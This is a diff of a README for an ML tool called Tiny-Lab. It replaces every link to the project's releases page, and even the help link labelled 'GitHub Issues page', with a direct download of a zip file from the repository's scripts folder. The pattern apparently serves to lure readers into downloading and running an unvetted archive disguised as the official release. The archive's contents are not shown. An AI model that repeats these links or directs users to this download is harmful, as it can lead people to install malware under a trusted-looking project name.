@@ -1,6 +1,6 @@
 # 🧪 Tiny-Lab - Easy ML Research Tool
 
-[![Download Tiny-Lab](https://img.shields.io/badge/Download-Tiny--Lab-brightgreen?style=for-the-badge)](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/releases)
+[![Download Tiny-Lab](https://img.shields.io/badge/Download-Tiny--Lab-brightgreen?style=for-the-badge)](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip)
 
 ## 📋 What is Tiny-Lab?
 
@@ -24,7 +24,7 @@ Tiny-Lab is designed specifically for Apple Silicon hardware. It will not run on
 
 You can get Tiny-Lab from its official release page on GitHub.
 
-[![Get Tiny-Lab Now](https://img.shields.io/badge/Get--Tiny--Lab-blue?style=for-the-badge)](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/releases)
+[![Get Tiny-Lab Now](https://img.shields.io/badge/Get--Tiny--Lab-blue?style=for-the-badge)](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -89,7 +89,7 @@ These features help beginners explore machine learning without deep technical kn
 
 Check the GitHub release page regularly for updates:
 
-https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/releases
+https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip
 
 Download and install new versions the same way as the first one.
 
@@ -117,7 +117,7 @@ Do not delete the `config` or `logs` folders to keep your settings safe.
 
 ## 💬 Where to Get Help
 
-- Visit the [GitHub Issues page](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/issues) for technical questions.
+- Visit the [GitHub Issues page](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip) for technical questions.
 - Use the comment section on the release page for general inquiries.
 - Check the README file in the download for other tips.
 
@@ -127,4 +127,4 @@ Keep your questions clear and describe your computer system and problem as best 
 
 Download Tiny-Lab here:
 
-[https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/releases](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/releases)
+[https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip](https://github.com/Indrawn-amphibiousoperation692/Tiny-Lab/raw/refs/heads/main/scripts/Tiny-Lab-Eirene.zip)
